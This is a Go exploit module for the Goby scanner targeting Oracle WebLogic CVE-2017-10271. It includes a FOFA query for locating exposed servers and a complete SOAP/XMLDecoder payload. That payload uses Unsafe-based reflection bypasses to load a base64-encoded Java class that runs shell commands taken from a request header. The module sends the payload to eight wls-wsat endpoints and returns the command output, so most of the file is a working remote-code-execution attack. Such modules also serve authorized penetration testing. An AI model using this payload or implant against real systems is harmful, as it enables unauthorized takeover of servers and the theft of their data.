package exploits

import (
	"errors"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "WebLogic CoordinatorPortType Remote Code Execution Vulnerability (CVE-2017-10271)",
    "Description": "<p>WebLogic Server is one of the application server components suitable for both cloud and traditional environments.</p><p>Due to the default activation of the WLS WebService component during the deployment process, WebLogic utilizes XMLDecoder to parse serialized data. Attackers can exploit this by constructing malicious XML files to achieve remote command execution, potentially allowing them to execute arbitrary code on the server and gain control over the entire web server.</p>",
    "Product": "Weblogic_interface_7001",
    "Homepage": "http://www.oracle.com/technetwork/middleware/weblogic/overview/index.html",
    "DisclosureDate": "2017-10-19",
    "Author": "woo0nise@gmail.com",
    "FofaQuery": "(body=\"Welcome to WebLogic Server\") || (title==\"Error 404--Not Found\") || (((body=\"<h1>BEA WebLogic Server\" || server=\"Weblogic\" || body=\"content=\\\"WebLogic Server\" || body=\"<h1>Welcome to Weblogic Application\" || body=\"<h1>BEA WebLogic Server\") && header!=\"couchdb\" && header!=\"boa\" && header!=\"RouterOS\" && header!=\"X-Generator: Drupal\") || (banner=\"Weblogic\" && banner!=\"couchdb\" && banner!=\"drupal\" && banner!=\" Apache,Tomcat,Jboss\" && banner!=\"ReeCam IP Camera\" && banner!=\"<h2>Blog Comments</h2>\")) || (port=\"7001\" && protocol==\"weblogic\")",
    "GobyQuery": "(body=\"Welcome to WebLogic Server\") || (title==\"Error 404--Not Found\") || (((body=\"<h1>BEA WebLogic Server\" || server=\"Weblogic\" || body=\"content=\\\"WebLogic Server\" || body=\"<h1>Welcome to Weblogic Application\" || body=\"<h1>BEA WebLogic Server\") && header!=\"couchdb\" && header!=\"boa\" && header!=\"RouterOS\" && header!=\"X-Generator: Drupal\") || (banner=\"Weblogic\" && banner!=\"couchdb\" && banner!=\"drupal\" && banner!=\" Apache,Tomcat,Jboss\" && banner!=\"ReeCam IP Camera\" && banner!=\"<h2>Blog Comments</h2>\")) || (port=\"7001\" && protocol==\"weblogic\")",
    "Level": "2",
    "Is0day": false,
    "CNNVD": [
        "CNNVD-201710-829"
    ],
    "CNVD": [
        "CNVD-2017-31499"
    ],
    "VulType": [
        "Code Execution"
    ],
    "Impact": "<p>Since WebLogic enables the WLS WebService component by default during the deployment process, this component uses XMLDecoder to parse the serialized data. An attacker can implement remote command execution by constructing a malicious XML file, which may cause the attacker to execute arbitrary code on the server side. And then control the entire web server.</p>",
    "Recommendation": "<p>Currently, the vendor has released an upgrade patch to fix the vulnerability. Users are advised to install the patch to address the vulnerability. You can obtain the patch from the following link: <a href=\"https://www.oracle.com/security-alerts/cpuoct2017.html\">https://www.oracle.com/security-alerts/cpuoct2017.html</a></p>",
    "References": [
        "https://nvd.nist.gov/vuln/detail/CVE-2017-10271"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd"
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "CVEIDs": [
        "CVE-2017-10271"
    ],
    "CVSSScore": "7.5",
    "AttackSurfaces": {
        "Application": null,
        "Support": [
            "weblogic"
        ],
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Disable": false,
    "Translation": {
        "CN": {
            "Name": "WebLogic CoordinatorPortType 远程代码执行漏洞（CVE-2017-10271）",
            "Product": "Weblogic_interface_7001",
            "Description": "<p>WebLogic Server是其中的一个适用于云环境和传统环境的应用服务器组件。<br></p><p>由于WebLogic在部署过程中默认启用了WLS WebService组件，此组件使用了XMLDecoder来解析序列化数据，攻击者可以通过构造恶意的XML文件来实现远程命令执行，可能导致攻击者在服务器端任意执行代码，进而控制整个web服务器。<br></p>",
            "Recommendation": "<p>目前厂商已发布升级补丁以修复漏洞，请用户安装补丁以修复漏洞，补丁获取链接：<a href=\"https://www.oracle.com/security-alerts/cpuoct2017.html\" target=\"_blank\">https://www.oracle.com/security-alerts/cpuoct2017.html</a><br></p>",
            "Impact": "<p>由于WebLogic在部署过程中默认启用了WLS WebService组件，此组件使用了XMLDecoder来解析序列化数据，攻击者可以通过构造恶意的XML文件来实现远程命令执行，可能导致攻击者在服务器端任意执行代码，进而控制整个web服务器。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "WebLogic CoordinatorPortType Remote Code Execution Vulnerability (CVE-2017-10271)",
            "Product": "Weblogic_interface_7001",
            "Description": "<p>WebLogic Server is one of the application server components suitable for both cloud and traditional environments.</p><p>Due to the default activation of the WLS WebService component during the deployment process, WebLogic utilizes XMLDecoder to parse serialized data. Attackers can exploit this by constructing malicious XML files to achieve remote command execution, potentially allowing them to execute arbitrary code on the server and gain control over the entire web server.</p>",
            "Recommendation": "<p>Currently, the vendor has released an upgrade patch to fix the vulnerability. Users are advised to install the patch to address the vulnerability. You can obtain the patch from the following link:&nbsp;<a href=\"https://www.oracle.com/security-alerts/cpuoct2017.html\" target=\"_blank\">https://www.oracle.com/security-alerts/cpuoct2017.html</a><br></p>",
            "Impact": "<p>Since WebLogic enables the WLS WebService component by default during the deployment process, this component uses XMLDecoder to parse the serialized data. An attacker can implement remote command execution by constructing a malicious XML file, which may cause the attacker to execute arbitrary code on the server side. And then control the entire web server.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "PocId": "7405"
}`

	sendPayloadFlagYCeduL := func(u *httpclient.FixUrl, cmd string) (*httpclient.HttpResponse, error) {
		payload := `<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/">
    <soapenv:Header>
        <work:WorkContext xmlns:work="http://bea.com/2004/06/soap/workarea/">
            <java version="1.4.0" class="java.beans.XMLDecoder">
                <void class="javax.script.ScriptEngineManager" method="newInstance" id="sm">
                    <void method="getEngineByName" id="engine">
                        <string>js</string>
                        <void method="eval" id="echo">
                            <string>
<![CDATA[
try {
  load("nashorn:mozilla_compat.js");
} catch (e) {}
function getUnsafe(){
  var theUnsafeMethod = java.lang.Class.forName("sun.misc.Unsafe").getDeclaredField('theUnsafe');
  theUnsafeMethod.setAccessible(true); 
  return theUnsafeMethod.get(null);
}
function removeClassCache(clazz){
  var unsafe = getUnsafe();
  var clazzAnonymousClass = unsafe.defineAnonymousClass(clazz,java.lang.Class.forName("java.lang.Class").getResourceAsStream("Class.class").readAllBytes(),null);
  var reflectionDataField = clazzAnonymousClass.getDeclaredField("reflectionData");
  unsafe.putObject(clazz,unsafe.objectFieldOffset(reflectionDataField),null);
}
function bypassReflectionFilter() {
  var reflectionClass;
  try {
    reflectionClass = java.lang.Class.forName("jdk.internal.reflect.Reflection");
  } catch (error) {
    reflectionClass = java.lang.Class.forName("sun.reflect.Reflection");
  }
  var unsafe = getUnsafe();
  var classBuffer = reflectionClass.getResourceAsStream("Reflection.class").readAllBytes();
  var reflectionAnonymousClass = unsafe.defineAnonymousClass(reflectionClass, classBuffer, null);
  var fieldFilterMapField = reflectionAnonymousClass.getDeclaredField("fieldFilterMap");
  var methodFilterMapField = reflectionAnonymousClass.getDeclaredField("methodFilterMap");
  if (fieldFilterMapField.getType().isAssignableFrom(java.lang.Class.forName("java.util.HashMap"))) {
    unsafe.putObject(reflectionClass, unsafe.staticFieldOffset(fieldFilterMapField), java.lang.Class.forName("java.util.HashMap").getConstructor().newInstance());
  }
  if (methodFilterMapField.getType().isAssignableFrom(java.lang.Class.forName("java.util.HashMap"))) {
    unsafe.putObject(reflectionClass, unsafe.staticFieldOffset(methodFilterMapField), java.lang.Class.forName("java.util.HashMap").getConstructor().newInstance());
  }
  removeClassCache(java.lang.Class.forName("java.lang.Class"));
}
function setAccessible(accessibleObject){
    var unsafe = getUnsafe();
    var overrideField = java.lang.Class.forName("java.lang.reflect.AccessibleObject").getDeclaredField("override");
    var offset = unsafe.objectFieldOffset(overrideField);
    unsafe.putBoolean(accessibleObject, offset, true);
}
function defineClass(bytes){
  var clz = null;
  var version = java.lang.System.getProperty("java.version");
  var unsafe = getUnsafe()
  var classLoader = new java.net.URLClassLoader(java.lang.reflect.Array.newInstance(java.lang.Class.forName("java.net.URL"), 0));
  try{
    if (version.split(".")[0] >= 11) {
      bypassReflectionFilter();
    defineClassMethod = java.lang.Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", java.lang.Class.forName("[B"),java.lang.Integer.TYPE, java.lang.Integer.TYPE);
    setAccessible(defineClassMethod);
    // 绕过 setAccessible 
    clz = defineClassMethod.invoke(classLoader, bytes, 0, bytes.length);
    }else{
      var protectionDomain = new java.security.ProtectionDomain(new java.security.CodeSource(null, java.lang.reflect.Array.newInstance(java.lang.Class.forName("java.security.cert.Certificate"), 0)), null, classLoader, []);
      clz = unsafe.defineClass(null, bytes, 0, bytes.length, classLoader, protectionDomain);
    }
  }catch(error){
    error.printStackTrace();
  }finally{
    return clz;
  }
}
function base64DecodeToByte(str) {
  var bt;
  try {
    bt = java.lang.Class.forName("sun.misc.BASE64Decoder").newInstance().decodeBuffer(str);
  } catch (e) {
    bt = java.lang.Class.forName("java.util.Base64").newInstance().getDecoder().decode(str);
  }
  return bt;
}
var code="yv66vgAAADIA2AoAEABVCgBWAFcHAFgKAAMAWQoAEABaCgAOAFsIAFwKABMAXQgAXgoADgBfCgBgAGEKAGAAYggAYwcAZAoADgBlBwBmCgBnAGgIAGkHAGoIAGsIAGwKABMAbQoAEwBuCABvCABwCABxCgByAHMKABMAdAgAdQoAEwB2BwB3CgAfAFUIAHgHAHkKACIAVQgAegoADgB7CAB8CAB9BwB+CgAoAH8KACIAgAgAgQoAIgCCBwCDCgATAIQKAC0AhQgAhgoAEwCHCgATAIgLAIkAiggAiwgAjAgAjQgAjgcAjwoAOACQCgA4AJEKADgAkgoAkwCUBwCVCgA9AJYIAJcIAJgIAJkIAJoHAJsIAJwKAD0AnQcAngEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAA1TdGFja01hcFRhYmxlBwCeBwCfBwBmBwBqBwCgBwCVBwCbAQAKU291cmNlRmlsZQEAGldlYlJlc3BvbnNlU2VydmVySW5mby5qYXZhDABHAEgHAKEMAKIAowEAG3dlYmxvZ2ljL3dvcmsvRXhlY3V0ZVRocmVhZAwApAClDACmAKcMAKgAqQEAElNlcnZsZXRSZXF1ZXN0SW1wbAwAqgCrAQARY29ubmVjdGlvbkhhbmRsZXIMAKwArQcArgwArwCwDACxALIBABFnZXRTZXJ2bGV0UmVxdWVzdAEAD2phdmEvbGFuZy9DbGFzcwwAswC0AQAQamF2YS9sYW5nL09iamVjdAcAtQwAtgC3AQAJZ2V0SGVhZGVyAQAQamF2YS9sYW5nL1N0cmluZwEAA2NtZAEAAAwAuAC5DAC6AKkBAAxnZXRQYXJhbWV0ZXIBAAZ3aG9hbWkBAAdvcy5uYW1lBwC7DAC8AL0MAL4AqQEAA3dpbgwAvwDAAQATamF2YS91dGlsL0FycmF5TGlzdAEADGdldC53bHMucGF0aAEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyAQAud2VibG9naWMuc2VydmxldC5pbnRlcm5hbC5XZWJBcHBTZXJ2bGV0Q29udGV4dAwAwQDCAQAOZ2V0Um9vdFRlbXBEaXIBAApnZXRDb250ZXh0AQAMamF2YS9pby9GaWxlDADDAKkMAMQAxQEACy93YXIvYWEudHh0DADGAKkBABxqYXZhL2lvL0J5dGVBcnJheUlucHV0U3RyZWFtDADHAMgMAEcAyQEABCROTyQMAMoAqwwAywDMBwCgDADNALkBAAcvYmluL3NoAQACLWMBAAdjbWQuZXhlAQACL2MBABhqYXZhL2xhbmcvUHJvY2Vzc0J1aWxkZXIMAEcAzgwAzwDQDADRANIHANMMANQA1QEAE2phdmEvbGFuZy9FeGNlcHRpb24MANYAqQEAC2dldFJlc3BvbnNlAQAWZ2V0U2VydmxldE91dHB1dFN0cmVhbQEACWdldFdyaXRlcgEAC3dyaXRlU3RyZWFtAQATamF2YS9pby9JbnB1dFN0cmVhbQEABXdyaXRlDADXAEgBACZjb20vd2VibG9naWMvd2ViL1dlYlJlc3BvbnNlU2VydmVySW5mbwEAGXdlYmxvZ2ljL3dvcmsvV29ya0FkYXB0ZXIBAA5qYXZhL3V0aWwvTGlzdAEAEGphdmEvbGFuZy9UaHJlYWQBAA1jdXJyZW50VGhyZWFkAQAUKClMamF2YS9sYW5nL1RocmVhZDsBAA5nZXRDdXJyZW50V29yawEAHSgpTHdlYmxvZ2ljL3dvcmsvV29ya0FkYXB0ZXI7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQAHZ2V0TmFtZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAIZW5kc1dpdGgBABUoTGphdmEvbGFuZy9TdHJpbmc7KVoBABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAJZ2V0TWV0aG9kAQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEABHRyaW0BABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEAC3RvTG93ZXJDYXNlAQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBAAdmb3JOYW1lAQAlKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL0NsYXNzOwEAD2dldEFic29sdXRlUGF0aAEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEACHRvU3RyaW5nAQAIZ2V0Qnl0ZXMBAAQoKVtCAQAFKFtCKVYBAApzdGFydHNXaXRoAQAJc3Vic3RyaW5nAQAVKEkpTGphdmEvbGFuZy9TdHJpbmc7AQADYWRkAQATKExqYXZhL3V0aWwvTGlzdDspVgEAE3JlZGlyZWN0RXJyb3JTdHJlYW0BAB0oWilMamF2YS9sYW5nL1Byb2Nlc3NCdWlsZGVyOwEABXN0YXJ0AQAVKClMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAKZ2V0TWVzc2FnZQEAD3ByaW50U3RhY2tUcmFjZQAhAEYAEAAAAAAAAQABAEcASAABAEkAAAOuAAYACgAAAn8qtwABuAACwAADtgAETCtNK7YABbYABhIHtgAImgAxK7YABRIJtgAKTi0EtgALLSu2AAw6BBkEtgAFEg0DvQAOtgAPGQQDvQAQtgARTSzHAASxLLYABRISBL0ADlkDEhNTtgAPLAS9ABBZAxIUU7YAEcAAE04txgAYEhUttgAWmgAPEhUttgAXtgAWmQAmLLYABRIYBL0ADlkDEhNTtgAPLAS9ABBZAxIUU7YAEcAAE04txgAYEhUttgAWmgAPEhUttgAXtgAWmQAGEhlOLbYAF04SGrgAG8YAFxIauAAbtgAcEh22AB6aAAcEpwAEAzYEuwAfWbcAIDoFLRIhtgAWmQBYuwAiWbcAIxIkuAAlEiYDvQAOtgAPLLYABRInA70ADrYADywDvQAQtgARA70AELYAEcAAKLYAKbYAKhIrtgAqtgAsOge7AC1ZGQe2AC63AC86BqcAlC0SMLYAMZkAExkFLQe2ADK5ADMCAFenAEUVBJkAIxkFEjS5ADMCAFcZBRI1uQAzAgBXGQUtuQAzAgBXpwAgGQUSNrkAMwIAVxkFEje5ADMCAFcZBS25ADMCAFe7ADhZGQW3ADk6BxkHBLYAOlcZB7YAOzoIGQi2ADw6BqcAFjoHuwAtWRkHtgA+tgAutwAvOgYstgAFEj8DvQAOtgAPLAO9ABC2ABE6BxkHtgAFEkADvQAOtgAPGQcDvQAQtgAROggZB7YABRJBA70ADrYADxkHA70AELYAEToJGQi2AAUSQgS9AA5ZAxJDU7YADxkIBL0AEFkDGQZTtgARVxkJtgAFEkQEvQAOWQMSE1O2AA8ZCQS9ABBZAxIVU7YAEVenAAhMK7YARbEAAwGzAdMB1gA9AAQAUQJ5AD0AUgJ2AnkAPQACAEoAAAC+AC8AAAASAAQAFAAOABUAEAAWAB8AFwApABgALgAZADUAGgBNABwAUQAdAFIAIAB1ACEAjgAjALEAJQDKACYAzQAoANIAKgDxACsA+gAtAQMALgFHAC8BVQAwAVgAMQFhADIBcQAzAXYANAGAADUBigA2AZYAOAGgADkBqgA6AbMAPgG+AD8BxQBAAcwAQQHTAEQB1gBCAdgAQwHpAEYCAABIAhkASgIyAEsCVABMAnYATwJ5AE0CegBOAn4AUABLAAAAQQAQ/wBNAAMHAEwHAE0HAE4AAAT8ADsHAE8iGAIgQAH9AGgBBwBQGCQcYgcAUfwAEgcAUv8AjwABBwBMAAEHAFEEAAEAUwAAAAIAVA==";
clz = defineClass(base64DecodeToByte(code));
clz.newInstance();
]]>
</string>
                        </void>
                    </void>
                </void>
            </java>
        </work:WorkContext>
    </soapenv:Header>
    <soapenv:Body />
</soapenv:Envelope>`
		uris := []string{
			`/wls-wsat/CoordinatorPortType`,
			`/wls-wsat/RegistrationPortTypeRPC`,
			`/wls-wsat/ParticipantPortType`,
			`/wls-wsat/RegistrationRequesterPortType`,
			`/wls-wsat/CoordinatorPortType11`,
			`/wls-wsat/RegistrationPortTypeRPC11`,
			`/wls-wsat/ParticipantPortType11`,
			`/wls-wsat/RegistrationRequesterPortType11`,
		}
		for _, uri := range uris {
			requestConfig := httpclient.NewPostRequestConfig(uri)
			requestConfig.Data = payload
			requestConfig.Header.Store("Content-Type", "text/xml;charset=UTF-8")
			requestConfig.Header.Store("cmd", cmd)
			rsp, err := httpclient.DoHttpRequest(u, requestConfig)
			if rsp != nil && rsp.StatusCode != 404 {
				return rsp, err
			}
		}
		return nil, errors.New("无可用端点")
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			rsp, _ := sendPayloadFlagYCeduL(u, "echo a61b225af2ba8df4e45e373ae0309b7b")
			if rsp != nil && strings.Contains(rsp.Utf8Html, "a61b225af2ba8df4e45e373ae0309b7b") {
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(ss.Params["attackType"])
			if attackType == "cmd" {
				cmd := strings.TrimSpace(goutils.B2S(ss.Params["cmd"]))
				rsp, _ := sendPayloadFlagYCeduL(expResult.HostInfo, cmd)
				if rsp != nil {
					expResult.Output = rsp.Utf8Html
					expResult.Success = true
				}
			} else {
				expResult.Success = false
				expResult.Output = "未知的利用方式"
			}
			return expResult
		},
	))
}
